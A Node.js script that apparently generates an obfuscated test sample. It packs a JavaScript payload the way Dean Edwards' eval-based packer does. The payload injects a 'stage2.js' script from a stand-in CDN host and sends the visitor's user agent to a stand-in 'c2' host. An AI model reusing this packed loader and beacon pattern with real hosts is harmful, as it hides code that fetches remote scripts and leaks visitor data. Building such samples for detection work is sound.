// Packs a benign payload the way Dean Edwards' packer (base62 word dictionary) does.
import fs from 'node:fs';
const payload = "document.write(unescape('%3Cscript%20src%3D%22https%3A//cdn.example.invalid/stage2.js%22%3E%3C/script%3E'));\nvar beacon = new Image(); beacon.src = 'https://c2.example.invalid/p?u=' + encodeURIComponent(navigator.userAgent);";
const words = [...new Set(payload.match(/\b\w+\b/g))];
const e = (c) => (c < 62 ? '' : e(Math.floor(c / 62))) + ((c = c % 62) > 35 ? String.fromCharCode(c + 29) : c.toString(36));
const packed = payload.replace(/\b\w+\b/g, (w) => e(words.indexOf(w)));
const src = `eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}(${JSON.stringify(packed)},62,${words.length},'${words.join('|')}'.split('|'),0,{}))\n`;
fs.writeFileSync(new URL('./packed.js', import.meta.url), src);
console.log('written samples/packed.js');
